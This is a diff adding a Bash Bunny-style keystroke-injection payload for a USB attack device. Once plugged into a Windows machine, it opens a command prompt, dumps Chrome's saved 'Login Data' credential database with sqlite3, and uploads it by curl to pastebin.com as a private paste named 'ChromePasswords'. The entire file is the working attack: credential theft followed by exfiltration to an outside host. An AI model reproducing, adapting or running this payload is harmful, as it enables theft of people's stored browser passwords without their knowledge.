@@ -1,0 +1,35 @@
+#!/bin/bash
+
+# DELAY IN MS
+# SFD = Super Fast Delay (waiting for CTRL V for example)
+SFD=100
+# FD = Fast Delay (waiting for WIN R for example)
+FD=500
+# ND = Normal Delay (waiting for programs to shut off)
+ND=1000
+# LD = Long Delay (waiting for programs to start or bash scripts to execute)
+LD=1500
+
+# SETUP
+LED M
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+DRIVER_LABEL='USB'
+
+# ATTACK
+LED ATTACK
+QUACK DELAY $FD
+QUACK GUI r
+QUACK DELAY $FD
+QUACK STRING cmd
+QUACK ENTER
+QUACK DELAY $FD
+QUACK STRING sqlite3 "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" .dump | curl -F 'paste=<-' https://pastebin.com/api/api_post.php -F 'api_dev_key={API_KEY}' -F 'api_option=paste' -F 'api_paste_private=2' -F 'api_paste_name=ChromePasswords'
+QUACK ENTER
+
+# CLEANUP
+LED Y
+
+# FINISH
+LED FINISH
+ATTACKMODE OFF
